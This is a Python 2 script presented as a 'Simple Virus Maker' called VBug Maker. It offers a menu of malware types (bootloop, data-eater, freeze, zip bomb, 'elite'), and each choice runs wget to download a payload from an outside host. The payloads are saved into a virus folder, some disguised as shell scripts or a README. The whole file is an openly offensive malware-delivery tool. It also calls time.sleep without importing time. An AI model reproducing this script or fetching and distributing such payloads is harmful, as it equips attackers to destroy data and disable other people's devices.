import os, sys
R = '\x1b[1;31m'
N = '\x1b[0m'
Y = '\x1b[1;33m'
G = '\x1b[1;37m'
print '%s+---------------------------------------------------+%s' % (R, N)
print '%s||[#]%s--------------%s[ VBug Maker ]%s---------------%s[#]||%s' % (Y, R, Y, R, Y, N)
print '%s||%s |___________%s[ Simple Virus Maker ]%s____________|%s ||%s' % (Y, R, Y, R, Y, N)
print '%s||%s |____________%s[ Err0r * Session ]%s______________|%s ||%s' % (Y, R, Y, R, Y, N)
print '%s+---------------------------------------------------+%s' % (R, N)
print
type_of_virus = raw_input(' %s[%s*%s] %s(%sB%s)%sootloop %s| %s(%sD%s)%sata-Eater %s| %s(%sF%s)%sreeze %s| %s(%sBO%s)%smb-Zip %s| %s(%sE%s)%slite %s:%s ' % (Y, R, Y, R, Y, R, G, Y, R, Y, R, G, Y, R, Y, R, G, Y, R, Y, R, G, Y, R, Y, R, G, R, Y))
if type_of_virus == 'B' or type_of_virus == 'b':
    print '\n %s[%s+%s]%s Download The Virus%s...%s' % (Y, R, Y, G, R, N)
    os.system('wget -q http://override.waper.co/files/bootloop.apk')
    os.system('mkdir virus/bootloop;mv bootloop.apk virus/bootloop/bootloop.sh')
    print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
    sys.exit()
else:
    if type_of_virus == 'D' or type_of_virus == 'd':
        print '\n %s[%s+%s]%s Download The Virus%s...%s' % (Y, R, Y, G, R, N)
        os.system('wget -q http://override.waper.co/files/dateater.apk')
        os.system('mkdir virus/data-eater;mv dateater.apk virus/data-eater/data-eater.sh')
        print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
        sys.exit()
    else:
        if type_of_virus == 'F' or type_of_virus == 'f':
            print '\n %s[%s+%s]%s Download The Virus%s...%s' % (Y, R, Y, G, R, N)
            os.system('wget -q http://override.waper.co/files/freeze.apk')
            os.system('mkdir virus/freeze;mv freeze.apk virus/freeze/freeze.apk')
            print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
            sys.exit()
        else:
            if type_of_virus == 'BO' or type_of_virus == 'bo':
                print '\n %s[%s+%s]%s Download The Virus%s...%s' % (Y, R, Y, G, R, N)
                os.system('wget -q http://override.waper.co/files/42.zip')
                os.system('wget -q http://override.waper.co/files/42.apk')
                os.system('mkdir virus/bomb-zip;mv 42.zip virus/bomb-zip/bom-zip.zip;mv 42.apk virus/bomb-zip/README.txt')
                print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
                sys.exit()
            else:
                if type_of_virus == 'E' or type_of_virus == 'e':
                    print '\n %s[%s+%s]%s Download The Virus%s...%s' % (Y, R, Y, G, R, N)
                    os.system('wget -q http://override.waper.co/files/31337.apk')
                    os.system('mkdir virus/ELITE;mv 31337.apk virus/ELITE/elite.apk')
                    print ' %s[%s+%s]%s Done%s.%s' % (Y, R, Y, G, R, N)
                    sys.exit()
                else:
                    print '%s[%s%s]%s ERR0R%s:%s Wrong Input...%s' % (Y, R, Y, R, Y, G, N)
                    time.sleep(2)
                    print '%s[%s!%s]%s ERR0R%s:%s Exit the Program...%s' % (Y, R, Y, R, Y, G, N)
                    sys.exit()
